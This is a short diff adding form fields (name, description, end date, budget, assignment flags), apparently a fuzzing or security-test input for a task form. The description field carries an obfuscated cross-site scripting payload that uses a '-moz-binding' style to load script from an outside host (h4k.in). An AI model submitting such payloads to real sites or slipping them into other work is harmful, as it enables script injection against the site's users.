@@ -1,0 +1,6 @@
+name : ws'.nY0W8yJyn.'  E S .s8
+desc : sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+end : 1.8.2016
+budget : 3,632
+assignto[] : 1
+assignme : 1
